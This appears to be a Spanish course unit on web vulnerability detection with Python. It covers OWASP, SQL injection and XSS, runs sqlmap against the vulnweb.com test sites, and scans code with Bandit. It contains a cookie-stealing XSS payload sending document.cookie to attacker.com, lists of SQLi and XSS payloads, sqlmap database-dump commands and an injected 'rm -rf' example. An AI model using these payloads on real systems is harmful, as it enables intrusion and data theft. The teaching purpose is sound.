# Conexiones con servidores FTP, SFTP y SSH desde Python

## Objetivos

### Competencia
- Conocer las principales herramientas desarrolladas por la comunidad de Python con el objeteivo de detectar vulnerabilidades en aplicaciones web como sql injection y cross site scripting utilizando la metodología OWASP.
- Estudiar con detalle las herramientas sqlmap y bandit para detectar vulnerabilidades en aplicaciones web y apliciones desarrolladas en Python.

### Resultados
- Identificar los principales elementos de la metodología OWASP y los diferentes tipos de vulnerabilidades en un sitio web.
- Comprender sqlmap como herramienta para detectar vulnerabilidades del tipo sql injection.
- Comprender Bandit como herramiento de análisis estático de código para detectar vulnerabilidades en código desarrollado con módulos de Python.
- Comprender PwnXSS como script que automatiza el proceso de detectar vulnerabilidades del tipo XSS(Cross Site Scripting).


---

## OWASP (Open Web Application Security Project)

- OWASP nos provee de un serie de recursos basados sobre todo, en guías y herramientas, para que nuestros proyectos web sean lo más seguros posibles, tanto desde el punto de vista del desarrollo seguro como de la evaluación de seguridad.

- Principales objetivos de OWASP:
    - Proporcionar a los desarrolladores una conjunto de buenas prácticas, para que las aplicaciones sean lo más seguras posibles.
    - Proporcionar a desarrolladores y profesionales de seguridad recursos para asegurar aplicaciones, en concreto, para aplicaciones móviles, surgió el proyecto OWASP Mobile Security Project.

## Introducción a  la metodología OWASP

- Uno de estos subproyectis es el OWASP TOP 10 Project, donde se definen y se detallan los 10 riesgos más importantes a nivel de aplicaciones web.

- Esta lista se va actualizando según el paso del tiempo y la variación de las técnicas y/o vulnerabilidades explotadas para tomar el control de una aplicación web o tener por ejemplo acceso no autorizado a recursos de bajo de estas aplicación.

- A continuación, se presentarán las vulnerabilidades más importantes y comunes en aplicaciones web del proyecto OWASP TOP 10.

    - [OWASP TOP 10 Project](https://owasp.org/www-project-top-ten/)

- Un proyecto interesante OWASP es la aplicación open source Zed Attack Project (ZAP), que nos permite realizar un análisis de todos los datos que se envían y que recibimos a la hora de realziar una navegación de un sitio web.

    - La herramienta se puede descargar desde el repostiorio:
        - https://www.zaproxy.org/
        - [Repositorio Github](https://github.com/zaproxy/zaproxy/wiki/Downloads)

### Inyección de comandos

- La inyección de comandos es uno de los ataques más comunes en aplicaciones web en el cual, el atacante explota alguna vulnerabilidad del sistema para ejecutar comandos SQL, NoSQL o LDAP con el fin de acceder a datos de forma no autorizada.

- Estas vulnerabilidades se pueden generar si no se hace una correcta validación y filtrado de los datos introducidos por el usuario, como podría ser por ejemplo en un campo de búsqueda dentro de la aplicación.

- La vulnerabilidad relacionada se puede generar cuando no se hace una correcta verificación de los campos de entrada del usuario.

- EL impacto puede tener la inyección de comandos, puede ser bastante grave ya que se podrían revela datos confidenciales, modificar los datos almacenados o denegar acceso a ciertos recursos.

- https://owasp.org/www-project-top-ten/2017/A1_2017-Injection.html

#### SQL Injection

- Se puede dar el caso en el cual el usuario en vez de introducir un texto para realizar una búsqueda introduce una consulta o cualquier comando SQL.

- Si no se hace una correcta validación y filtrado de los datos introducidos en este campo, se podría concatenar la consulta o comando dañino a una consulta interna SQL o cualquier otro dialecto haciendo que el intérprete ejecute la consulta introducida por el atacante.

- Un posible escenario de este tipo de ataques podría ser una aplicación que concatena datos no validados en una consulta SQL, por ejemplo:

    ```js
    # Consulta SQL maliciosa
    String query = "SELECT * FROM tabla WHERE id = '" + request.getParameter("id") + "'";
    ```

- Cómo se puede ver, se concatena sin ningún tipo de verificación o filtrado del parámetro id introducido por el usuario. De manera que si un atacante introduce un comando SQL este sería ejecutado.

- Un atacante podría introducir por ejempllo el parámetro id como ' or '1'='1.

    - Esto haría que el sentido de la consulta cambie totalmente, devolviendo todos los registros de la tabla ya que la condicion "1=1" simpre se cumple.


    ![alt text](/resources/sqlinjection.png)

    - Mediante un ataque por inyección de SQL exitoso, se puede leer información sensible desde la base da datos, modficiar la información (Insert, Update, Delete), ejecutar operaciones de administración sobre la base de datos (por ejemplo, parar la base de datos), recuperar el contenido de un determinado archivo presente en el sistema del DBMS y, en algunos casos, emitir comandos al sistema operativo.

    - Los ataques por inyección de SQL son un tipo de ataque de inyección, en el cual los comando SQL se insertan en la entrada de datos, con la finaldiad de efectuar la ejecución de comandos SQL predefinidos.


#### Cross Site Scripting (XSS)

- Este tipo de vulnerabilidad es el segundo más frecuente en aplicaciones web según OWASP Top 10.

- La explotación de este tipo de vulnerabilidad pretender ejecutar comandos en el navegador de la víctima para robar sus credenciales, obtener la sesión de usuario, instalar software en el equipo de la víctima o redirigir al usuario o sitios maliciosos.

- Dentro de los posibles errores de XSS, podemos distinguir dos grandes categorías:

    - `No permanentes`

        Ejemplo: Nos encontramos con una página web que disponde de buscador, el cual, al intoducir una palabra inventada o una cadena aleatoria de caraceteres, muestra un mensaje del tipo "No se ha encontrado resultados para la búsqueda `<texto&gt;`", donde `<texto&gt;` es la cadena introducida en el campo de búsqueda.

        Si en la búsqueda se introduce como `<texto&gt;` el código JavaScript abtes indicado, y de nuevo aparece la ventana de alerta, significa que la aplicación es vulnerable a XSS. La diferencia radica en que, en esta ocación, los efectos de la acción no resultan permanentes.

    - `Permanentes`

        Sy denominación se debe al hecho de que, como mostraba el ejemplo anterior, la ventana de aletarta en JavaScript queda almacenada en algún lugar, habitualmente una base de datos SQL, y se muestra a cualquier usuario que visite nuestro perfil.

        Evidentemente, este tipo de fallos XSS son mucho más peligrosos que los no permanentes.

- Existen tres situaciones en las que un ataque puede conseguir un ataque exitoso con XSS:

    - `XSS Reflejcada (XSS Reflected)`

        En este caso, el ataque puede ser exitoso si la aplicación hace uso de datos sin validad proporcionados por un usuario y codificados como parte del HTML o JavaScript de la aplicación.

    - `XSS almaceaado (XSS Stored)`

        Este caso se puede dar cuando la aplicación almacena datos sin ser validados y filtrados y que posteriormente muestra al usuario. 
        
        En este caso, el atacante puede conseguir almacernar datos malicioss para que sean ejecutados cuando estos sean consultados por el usuario. 
        
        Se considera de riesgo muy alto estas situaciones.

    - `XSS Basados en DOM (DOM Based)`

        En aplicación que hacen usado del framework de JAvaScrip DOM, el aacante puede conseguir controlar los datos que se intercambian dinámicamente en la páguina.

- Con este tipo de ataques, el impacto sobre el sistema puede ser alto, ya que el atacante podría conseguir desde el robo de la sesión del usuario, hasta la invasión de la autenticación.

- Un posible escenario pordría ser el siguiente:

    - La aplicación hace uso de datos no confiables permitiendo que un atacante puede incrustar su propio código:

        ```js
         (String) page += "<input name='creditcard' type='TEXT' value='" + request.getParameter("creditcard") + "'>";
        ```
    
    - En este caso el atacante podría modificar el parámetro creditcar mediante el método GET y conseguir robar el identificador de la sesión del usuario.

        ```
         <script>document.location= 'http://www.attacker.com/cgibin/cookie.cgi?foo=' +document.cookie</script>
        ```

- [OWASP Cross Site Scripting](https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS).html)


## OWASP Python Security Project
- https://readthedocs.org/projects/owasp-pysec/
- https://github.com/ebranca/owasp-pysec

- Se trata de un proyecto de código abierto que tiene como objetivo mostrar aquellas herramientas Python que facilitan a los desarrolladores y profesionales de la seguridad desarrollar aplicaciones más seguras antes de posibles ataques.

- Ha sido diseñado para explorar cómo se pueden desarrollar aplicaciones web de forma segura, al abordar el problema desde varios puntos de vista diferentes: análisis de caja blanca y de caja negra, así como análisis estructural y funcional.


## Scripts en Python para detectar vulnerabilidades en sitios web.

- La lista de vulnerabilidades que se pueden encontrar en una aplicación web es amplia, desde Cross Site Scripting y hasta inyección SQL.

- El sitio web proporcionado por acunetix, ofrece algunos sitios web que contienen algunas vulnerabilidades mencionadas, donde cada sitio está hecho con diferentes tecnoclogías en el lado del backend.

    - http://www.vulnweb.com/


### Script en Python para detectar SQL Injection

- Una forma sencilla de identificar sitios web con la vulnerabilidad de inyección de SQL es aadir algunos caracteres a la URL, como comillas o puntos.

- Por ejemplo, si decta que una URL con un sitio php donde está usando un parámetro para una búsqueda específica, puede intentar aádir un carácter especial en este parámetro.

- Por ejemplo, la siguiente URL devuelve un error relacionado con la base de datos cuanto intentamos utilizar un vector de ataque sobre el parámetro vulnerable:

    - http://testphp.vulnweb.com/listproducts.php?cat=%27s    

- Con Python podríamos contruir un script que lea desde el fichero `sql-attack-vector.txt` posibles vectores de ataque sql y comprobar la salida como resultado de inyectar cadenas específicas.

- El obejtivo del siguiente script es partir de una url donde identificamos el parámetro vulenerable y combinamos la url origial con estos vectores de ataque.

    - [Código de ejemplo](/Unidad_10_Análisis_de_vulnerabilidades_en_aplicaicones_web_con_Python/2-Script_sql_inyeccion.py)

    Resultado:

    ```bash
    Testing http://testphp.vulnweb.com/listproducts.php?cat=" or "a"="a
    Injectable MySQL detected, attack string: " or "a"="a
    Testing http://testphp.vulnweb.com/listproducts.php?cat=" or "x"="x
    Injectable MySQL detected, attack string: " or "x"="x
    Testing http://testphp.vulnweb.com/listproducts.php?cat=" or 0=0 #
    Injectable MySQL detected, attack string: " or 0=0 #
    Testing http://testphp.vulnweb.com/listproducts.php?cat=" or 0=0 --
    Injectable MySQL detected, attack string: " or 0=0 --
    Testing http://testphp.vulnweb.com/listproducts.php?cat=" or 1=1 or ""="
    Payload  " or 1=1 or ""="  not injectable
    Testing http://testphp.vulnweb.com/listproducts.php?cat=" or 1=1--
    Injectable MySQL detected, attack string: " or 1=1--
    Testing http://testphp.vulnweb.com/listproducts.php?cat="' or 1 --'"
    Payload  "' or 1 --'"  not injectable
    Testing http://testphp.vulnweb.com/listproducts.php?cat=") or ("a"="a
    Injectable MySQL detected, attack string: ") or ("a"="a
    Testing http://testphp.vulnweb.com/listproducts.php?cat='
    Injectable MySQL detected, attack string: '
    Testing http://testphp.vulnweb.com/listproducts.php?cat=' (select top 1
    Injectable MySQL detected, attack string: ' (select top 1
    Testing http://testphp.vulnweb.com/listproducts.php?cat=' --
    Injectable MySQL detected, attack string: ' --
    ...
    ``` 

    - Vemos que el parámetro `cat` es vulnerable a inyección SQL, por lo que podemos probar diferentes payloads para intentar inyectar SQL en el parámetro `cat`.

### Script en Python para detectar Cross-Site Scripting (XSS)

- Los errores XSS ocurren cada vez que una aplicación toma datos no confiables y los envía al navegador web sin una validación y codificación apropiada.

- XSS no permite a los atacantes ejecutar una secuencia de comandos en el navegador de la víctima, los cuales pueden obtener las sesiones de usuario o dirigir al usuario hacia un sitio malicioso.

- Para probar si un sitio web es vulnerable a XSS, podríamos usar el siguiente script donde leemos de un archivo `XSS-attack-vector.txt`  que contiene posibles vectores de ataque que tienen como objetivo explorar dicha vulnerabilidad.

- [Código de ejemplo](/Unidad_10_Análisis_de_vulnerabilidades_en_aplicaicones_web_con_Python/3-Script_xss.py)

    - Estamos leyendo un archivo que contiene payloads XSS y estamoa guardando estsos payloads en un array llamado `xsspayloads`. Posteriormente, usaremos la respuesta obtenida de realizar la petición al sitio web en combinación con el módulo BeautifulSoup para analizar los campos de entrada de la página del formulario.

    Resultado:

    ```bash
    <input name="searchFor" size="10" type="text"/>
    <input name="goButton" type="submit" value="go"/>
    Payload <SCRIPT>alert('XSS');</SCRIPT> returned in the response
    <input name="searchFor" size="10" type="text"/>
    <input name="goButton" type="submit" value="go"/>
    Payload '';!--"<XSS>=&{()} returned in the response
    <input name="searchFor" size="10" type="text"/>
    <input name="goButton" type="submit" value="go"/>
    Payload <SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT> returned in the response
    <input name="searchFor" size="10" type="text"/>
    <input name="goButton" type="submit" value="go"/>
    Payload <IMG SRC="javascript:alert('XSS');"> returned in the response
    <input name="searchFor" size="10" type="text"/>
    <input name="goButton" type="submit" value="go"/>
    Payload <IMG SRC=javascript:alert('XSS')> returned in the response
    <input name="searchFor" size="10" type="text"/>
    <input name="goButton" type="submit" value="go"/>
    Payload <IMG SRC=JaVaScRiPt:alert('XSS')> returned in the response
    <input name="searchFor" size="10" type="text"/>
    <input name="goButton" type="submit" value="go"/>
    Payload <IMG SRC=javascript:alert(&quot;XSS&quot;)> returned in the response
    <input name="searchFor" size="10" type="text"/>
    <input name="goButton" type="submit" value="go"/>
    Payload <IMG SRC=`javascript:alert("RSnake says, 'XSS'")`> returned in the response
    <input name="searchFor" size="10" type="text"/>
    <input name="goButton" type="submit" value="go"/>
    Payload <IMG SRC=javascript:alert(String.fromCharCode(88,83,83))> returned in the response
    <input name="searchFor" size="10" type="text"/>
    <input name="goButton" type="submit" value="go"/>
    Payload SRC=&#10<IMG 6;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;> returned in the response
    <input name="searchFor" size="10" type="text"/>
    <input name="goButton" type="submit" value="go"/>
    Payload <IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041> returned in the response
    <input name="searchFor" size="10" type="text"/>
    ...
    ```

    - Podemos comprabar esta vulnerabilidad en el sitio web inyectando en el campo de busqueda alguno de los payloads que hemos analizado.

#### Ejercicio: Código para desarrollar diferente scripts con el objetivo de detectar vulnerabilidades del tipo XSS y sql injection en un sitio web.

- [Código del ejercicio](/Unidad_10_Análisis_de_vulnerabilidades_en_aplicaicones_web_con_Python/4-Script_xss_sql_inyeccion.py)

- Resultado:

    ```bash
    site vulnerable to sql injection
    The parameter is vulnerable
    Payload string: <SCRIPT>alert('XSS');</SCRIPT>

    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
    "http://www.w3.org/TR/html4/loose.dtd">
    <html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
    <head>
    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

    <!-- InstanceBeginEditable name="document_title_rgn" -->
    ...
    ```

## Introducción a la herramienta `SQLmap` para detectar vulnerabilidades del tipo `SQL injection`

- `SQLmap` es una de las herramientas más conocidas escrita en Python para detecar vulnerabilidades del tipo `SQL injection`.

- Se trata de una herramienta desarrollada en Python que permite automatizar el reconocimiento y la explotación de múltiples bases de datos, como MySQL, Oracle o PostgreSQL.

- https://sqlmap.org/

- `SQLmap` viene preinstalado con alguna distribuciones de Linux orientads a tareas de seguridad, como `Kali Linux` o `Parrot Security OS`, que es una de las distribuciones preferidas por la maupría de auditores de seguridad y pentesters.

- También se puede isntalar `sqlmap` en otra distribuciones Debian:

    ```bash
    $ sudo apt-get install sqlmap
    ```

- Para hacer esto, la herramienta permite solicitar parámetros de una URL, ya sea a través d euna solicitud GET o POST, y detectar si, para algún parámetro del dominio paa analizar, se muestra vulnerable o algún tipo de ataque SQL Injection, debido a que los parámetros no se están validando correctamente.

### Ejecutar `sqlmap` sobre un dominio vulenerable

- Estos son los principales pasos que podemos seguir para obtener toda la información sobre una base de datos que está detrás de una vulnerabilidad de inyección de SQL:

    1. En primer lugar, usamos el parámetros `-u` para añadir la URL del sitio que vamos a analizar. Para ello usamos el siguiente

        ```bash
        $ sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1
        ```

        Ejecutando el comando anterior, podemos ver cómo el parámetro cat es vulnerable.

        Salida parcial:

        ```bash
        [10:14:11] [INFO] GET parameter 'cat' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
        GET parameter 'cat' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
        sqlmap identified the following injection point(s) with a total of 47 HTTP(s) requests:
        ---
        Parameter: cat (GET)
            Type: boolean-based blind
            Title: AND boolean-based blind - WHERE or HAVING clause
            Payload: cat=1 AND 3416=3416

            Type: error-based
            Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
            Payload: cat=1 AND GTID_SUBSET(CONCAT(0x7171787871,(SELECT (ELT(9102=9102,1))),0x7178767071),9102)

            Type: time-based blind
            Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
            Payload: cat=1 AND (SELECT 8440 FROM (SELECT(SLEEP(5)))XvdJ)

            Type: UNION query
            Title: Generic UNION query (NULL) - 11 columns
            Payload: cat=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7171787871,0x6450647158556b6b6672526e46716f4b625257596a486672516852457862726776455665646d774b,0x7178767071),NULL,NULL,NULL-- -
        ---
        ```

    2. Extracción de tablas y columnas de una base de datos

        SQLmap también tiene la capacidad de atacar el servidor para descubrir nombres de tablas, descargar la base de datos y realizar consultas SQL de forma automática.

        Podríamos estar interesados en obtener todas las bases de datos que utiliza el sitio web a través de la opción `--dbs`:

            ```bash
            sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 --dbs
            ```

        Con la  ejecución del comando anterior, podemos obtener información sobre las bases de datos obtenidas, acuart e información_esquema. Esta es una salida parcial:

        ```bash
         [20:47:39] [INFO] the back-end DBMS is MySQL

        web application technology: Nginx, PHP 5.3.10

        back-end DBMS: MySQL >= 5.0

        [20:47:39] [INFO] fetching tables for database: 'information_schema"

        Database: information_schema

        [28 tables]

        + ------------------- +

        | CHARACTER_SETS  |

        | COLLATIONS      |

        | COLLATION_CHARACTER_SET_APPLICABILITY |

        | COLUMNS   |
        ```

        Una vez que la herramienta ha identificado la base de datos, podríamos preguntar al usuario si desea probar oro tipos de bases de datos o si desea probar otros parámetros en el sitio web en busca de vulnerabilidades.

    3. El siguiente paso podría ser utilizar el parámetro `-D`junto con el nombre de la base de datos para acceder a cualquiera de las bases de datos en particular.

        En el siguiente ejemplo, estamos usando la opción `--tables` para acceder a la base de datos `information_schema`:
        
        ```bash
        sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D information_schema --tables
        ```

        Con la ejecución del comando anterior, podemos obtener información sobre las tablas disponibles en la base de datos `information_schema`. Esta es una salida parcial:

        ```bash
        [21:23:30] [INFO] the back-end DBMS is MySQL

        web application technology: Nginx, PHP 5.3.10

        back-end DBMS: MySQL >= 5.0

        [21:23:30] [INFO] fetching columns for table 'views' in database 'information_schema'

        Database: information_schema

        Table: views

        [10 columns]

        + ------------------- + ----------------- +
        | Column              | Type              |
        + ------------------- + ----------------- +
        | CHARACTER_SET_CLIENT | varchar(32) |

        | CHECK_OPTION       | varchar(8) |

        | COLLATION_CONNECTION | varchar(32) |

        | DEFINER            | varchar(77) |

        | IS_UPDATABLE       | varchar(3) |

        | SECURITY_TYPE      | varchar(7) |

        | TABLE_CATALOG      | varchar(512) |

        | TABLE_NAME         | varchar(64) |

        | TABLE_SCHEMA       | varchar(64) |

        | VIEW_DEFINITION        | longtext |
        + ------------------- + ----------------- +
        ```

    4. Acceder a información de una tabla

        De manera similar, podemos acceder a toda la información en una tabla específica usando el siguiente comando, donde `--dump` recupera todos los datos de la tabla engines:

        ```bash
        sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D information_schema engines --dump
        ```

        Con la ejecución del comando anterior, podemos obtener información sobre la tabla engines. Esta es una salida parcial:

        ```bash
        Database: information_schema
        Table: COLUMNS_EXTENSIONS
        [765 entries]
        +--------------------+---------------------------------------+---------------+-----------------------------------+--------------------+------------------------------+
        | TABLE_SCHEMA       | TABLE_NAME                            | TABLE_CATALOG | COLUMN_NAME                       | ENGINE_ATTRIBUTE   | SECONDARY_ENGINE_ATTRIBUTE   |
        +--------------------+---------------------------------------+---------------+-----------------------------------+--------------------+------------------------------+
        [10:45:10] [WARNING] console output will be trimmed to last 256 rows due to large table size
        | information_schema | PROCESSLIST                           | def           | COMMAND                           | NULL               | NULL                         |
        | information_schema | PROCESSLIST                           | def           | TIME                              | NULL               | NULL                         |
        | information_schema | PROCESSLIST                           | def           | STATE                             | NULL               | NULL                         |
        | information_schema | PROCESSLIST                           | def           | INFO                              | NULL               | NULL                         |
        | information_schema | PROFILING                             | def           | QUERY_ID                          | NULL               | NULL                         |
        | information_schema | PROFILING                             | def           | SEQ                               | NULL               | NULL                         |
        | information_schema | PROFILING                             | def           | STATE                             | NULL               | NULL                         |
        | information_schema | PROFILING                             | def           | DURATION                          | NULL               | NULL                         |
        | information_schema | PROFILING                             | def           | CPU_USER                          | NULL               | NULL                         |
        ...
        ```	

#### Ejercicio:
Analizar el dominio http://testasp.vulnweb.com/ con el objetivo de detectar una vulnerabilidad del tipo `SQL injection`.

```bash
sqlmap -u http://testasp.vulnweb.com/showthread.asp?id=1

# Output
[11:03:28] [INFO] checking if the injection point on GET parameter 'id' is a false positive
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
sqlmap identified the following injection point(s) with a total of 108 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 3934=3934

    Type: stacked queries
    Title: Microsoft SQL Server/Sybase stacked queries (comment)
    Payload: id=1;WAITFOR DELAY '0:0:5'--

    Type: time-based blind
    Title: Microsoft SQL Server/Sybase time-based blind (IF)
    Payload: id=1 WAITFOR DELAY '0:0:5'
---
```

Pasos:
- Obtener bases de datos.
    ```bash
    sqlmap -u http://testasp.vulnweb.com/showthread.asp?id=1 --dbs

    # Output
    [11:05:47] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
    available databases [6]:
    [*] [master]
    [*] acuforum
    [*] acuservice
    [*] model
    [*] msdb
    [*] tempdb
    ```

- Obtener tablas de una base de datos
    ```bash	
    sqlmap -u http://testasp.vulnweb.com/showthread.asp?id=1 -D <base_datos> --tables

    sqlmap -u http://testasp.vulnweb.com/showthread.asp?id=1 -D acuforum --tables

    # Output
    [11:07:02] [INFO] retrieved: dbo.users
    Database: acuforum
    [4 tables]
    +---------+
    | forums  |
    | posts   |
    | threads |
    | users   |
    +---------+
    ```
    
- Obtener columnas de una tabla de una base de datos
    ```bash
    sqlmap -u http://testasp.vulnweb.com/showthread.asp?id=1 -D <base_datos> -T <tabla> --columns
    sqlmap -u http://testasp.vulnweb.com/showthread.asp?id=1 -D acuforum -T forums --columns

    # Output
    [11:10:24] [INFO] retrieved: timestamp
    Database: acuforum
    Table: forums
    [4 columns]
    +----------------+-----------+
    | Column         | Type      |
    +----------------+-----------+
    | name           | nvarchar  |
    | descr          | nvarchar  |
    | id             | int       |
    | SSMA_TimeStamp | timestamp |
    +----------------+-----------+
    ```

- Acceder a toda la información en una tabla específica.
    ```bash
    # donde el parámetro --dump recupera todos los datos de la tabla forums
    sqlmap -u http://testasp.vulnweb.com/showthread.asp?id=1 -D acuforum -T forums --dump   

    # Output
    Database: acuforum
    Table: forums
    [3 entries]
    +----+------------------------------------------------+------------------------------------+----------------+
    | id | descr                                          | name                               | SSMA_TimeStamp |
    +----+------------------------------------------------+------------------------------------+----------------+
    | 0  | Talk about Acunetix Web Vulnerablity Scanner   | Acunetix Web Vulnerability Scanner | <blank>        |
    | 1  | What weather is in your town right now         | Weather                            | <blank>        |
    | 2  | Anything crossing your mind can be posted here | Miscellaneous                      | <blank>        |
    +----+------------------------------------------------+------------------------------------+----------------+

    ```
- Obtener información sobre todas las tablas de la base de datos actual.
    ```bash
    # Para esta tarea podemos usar los indicadores como --tables y --columns para obtener todos los nombres de tablas y columnas
    sqlmap -u http://testasp.vulnweb.com/showthread.asp?id=1 --tables --columns

    # Output

    ```

## Introducción a la herramienta `Bandit` para detectar vulnerabilidades en proyectos de Python

- Python es un lenguaje que permite escalar fácilmente de proyectos inciales a aplicaciones complejas para procesar datos y servir páginas web dinámicas.

- Pero, a medida que aumenta la complejidad de sus aplicaciones, puede ser fácil presentar problemas de seguridad y vulnerabilidades.

- `Bandit` es una herramienta diseñada para encontrar problemas de seguidad comunes en el código Python. 

- Para hacer eso, procesa cada archivo, crea un AST a partir de él y ejecuta los complementos apropiados contra los nodos de AST.

- Una vez que Bandit ha terminado de escanear todos los archivos genera un informe.

- [Documentación oficial](https://bandit.readthedocs.io/en/latest/)
- [Documentación del modulo Python AST](https://docs.python.org/3/library/ast.html)

- `Bandit` usa el módulo AST de la biblioteca estándar de Python para analizar su código Python.

- Este módulo solo puede analizar el código Python que es válido en la versión del interprete desde el que se importa.

- De esta forma, si se intenta usar el módulo AST desde un intérprete Python 3..5, el código debería estar escrito para 3.5 para poder analizar el código.

### Instalar y ejecutar `Bandit`

- La instalación de la herramienta desde una distribución como Ubuntu sería tan sencillo como:

    ```bash
    $ sudo apt-get install python3-bandit
    ```

- `Bandit` también sistribuye en el repositorio oficial de Python PyPI, cuya instalación se puede realizar con el comando:

    ```bash
    $ sudo pip3 install bandit
    ```

- Bandit soporta muchos tipos de pruebas diferentes para detectar diversos problemas de seguridad en el código Python.

- Estas pruebas se cean como complementos o plugins entre los que podemos destacar:

    ![alt text](/resources/plugins_bandit.png)

### Análisis de vulnerabilidades con `Bandit`

- Consideremos el siguiente código Python:

    - [Código inseguro](/Unidad_10_Análisis_de_vulnerabilidades_en_aplicaicones_web_con_Python/5-codigo_inseguro.py)

    ```python
    import pickle
    import sys
    from urllib.request import urlopen

    obj = pickle.loads(urlopen(sys.argv[1]).read())
    print(obj)
    ```

    - Si ejecutamos `bandit` con este fichero, detecta una serie de vulnerabilidades en el código:

    ```bash
    python3-bandit <ruta_codigo_python>
    ```

    ```bash	
    bandit Unidad_10_Análisis_de_vulnerabilidades_en_aplicaicones_web_con_Python/5-codigo_inseguro.py
    [main]  INFO    profile include tests: None
    [main]  INFO    profile exclude tests: None
    [main]  INFO    cli include tests: None
    [main]  INFO    cli exclude tests: None
    [main]  INFO    running on Python 3.10.12
    Run started:2024-11-24 10:24:24.359873

    Test results:
    >> Issue: [B403:blacklist] Consider possible security implications associated with pickle module.
    Severity: Low   Confidence: High
    CWE: CWE-502 (https://cwe.mitre.org/data/definitions/502.html)
    More Info: https://bandit.readthedocs.io/en/1.7.10/blacklists/blacklist_imports.html#b403-import-pickle
    Location: ./Unidad_10_Análisis_de_vulnerabilidades_en_aplicaicones_web_con_Python/5-codigo_inseguro.py:1:0
    1       import pickle
    2       import sys
    3       from urllib.request import urlopen

    --------------------------------------------------
    >> Issue: [B301:blacklist] Pickle and modules that wrap it can be unsafe when used to deserialize untrusted data, possible security issue.
    Severity: Medium   Confidence: High
    CWE: CWE-502 (https://cwe.mitre.org/data/definitions/502.html)
    More Info: https://bandit.readthedocs.io/en/1.7.10/blacklists/blacklist_calls.html#b301-pickle
    Location: ./Unidad_10_Análisis_de_vulnerabilidades_en_aplicaicones_web_con_Python/5-codigo_inseguro.py:5:6
    4
    5       obj = pickle.loads(urlopen(sys.argv[1]).read())
    6       print(obj)

    --------------------------------------------------
    >> Issue: [B310:blacklist] Audit url open for permitted schemes. Allowing use of file:/ or custom schemes is often unexpected.
    Severity: Medium   Confidence: High
    CWE: CWE-22 (https://cwe.mitre.org/data/definitions/22.html)
    More Info: https://bandit.readthedocs.io/en/1.7.10/blacklists/blacklist_calls.html#b310-urllib-urlopen
    Location: ./Unidad_10_Análisis_de_vulnerabilidades_en_aplicaicones_web_con_Python/5-codigo_inseguro.py:5:19
    4
    5       obj = pickle.loads(urlopen(sys.argv[1]).read())
    6       print(obj)

    --------------------------------------------------

    Code scanned:
            Total lines of code: 5
            Total lines skipped (#nosec): 0

    Run metrics:
            Total issues (by severity):
                    Undefined: 0
                    Low: 1
                    Medium: 2
                    High: 0
            Total issues (by confidence):
                    Undefined: 0
                    Low: 0
                    Medium: 0
                    High: 3
    Files skipped (0):
    ```

    - En la salida vemos los resultados donde para cada una de esas advertencias nos devuelve la línea de código específica donde se podría encontrar una posible vulnerabilidad.


### Plugins de `Bandit` para análisis de código estático.

- Bandit es una herramienta de `análisis estático` que analiza los ficheros con código python en un arbol de sintaxis abstracta (AST) representativo y busca llamadas, cadenas y otros elementos generalmente asociados con código inseguro.

- Por ejemplo el plugin `B602: subprocess_popen_with_shell_equals_true` busca el uso de la llamada `subprocess.Popen` que emplea como argumento en la llamada shell=True. Este tipo de llamada no resulta recomendable, ya que se muestra vulnerable a varios ataques de inyección de shell.
    - https://bandit.readthedocs.io/en/latest/plugins/b602_subprocess_popen_with_shell_equals_true.html

- El plugin `shell_injection` explora aquellos métodos y llamadas que se encuentran en la sección de subprocess y tiene el parámetro shell=True.

    ```python
    shell_injection:

    # Start a process using the subprocess module, or one of its
    wrappers.
    subprocess:
        - subprocess.Popen
        - subprocess.call
    ```	

- `subprocess.Popen(command_to_execute, shell=True)`

    - En la instrucción anterior, el método `Popen` del módulo `subprocess` requiere como argumentos el comando a ejecutar y el parámetro shell=True que puede ser origen de una vulnerabilidad de inyección de comandos.

#### Ejemplo módulo subprocess

- El siguiente script usa el módulo `subprocess`, para ejecutar el comando `ping` sobre un servidor cuya IP se pasa por parámetro.

    - [Código inseguro](/Unidad_10_Análisis_de_vulnerabilidades_en_aplicaicones_web_con_Python/6-ping_server_inseguro.py)

- El principal problema del script anterior es que el shell puede procesar otros comandos proporcionados por el usuario después de finalizar el comando ping. 

- La vulnerabilidad se produce con el parámetro `server`, que es controlado por el usuario y se podría utilizar para ejecutar comandos arbitrarios; como por ejemplo, la eliminación de archivos.

    ```bash
    >>> ping("8.8.8.8; rm -rf/")
    64 bytes from 8.8.8.8: icmp_seq=1 ttl=58 time=6.32 ms
    rm: cannot remove `/bin/dbus-daemon": Permission denied
    rm: cannot remove `/bin/dbus-uuidgen": Permission denied
    rm: cannot remove `/bin/dbus-cleanup-sockets": Permission denied
    rm: cannot remove `/bin/cgroups-mount": Permission denied
    rm: cannot remove `/bin/cgroups-umount": Permission denied
    ```	

- Si analizamos el script con `bandit` podemos ver las vulnerabilidades que se encuentran al usar este método:

    ```bash
    bandit Unidad_10_Análisis_de_vulnerabilidades_en_aplicaicones_web_con_Python/6-ping_server_inseguro.py
    [main]  INFO    profile include tests: None
    [main]  INFO    profile exclude tests: None
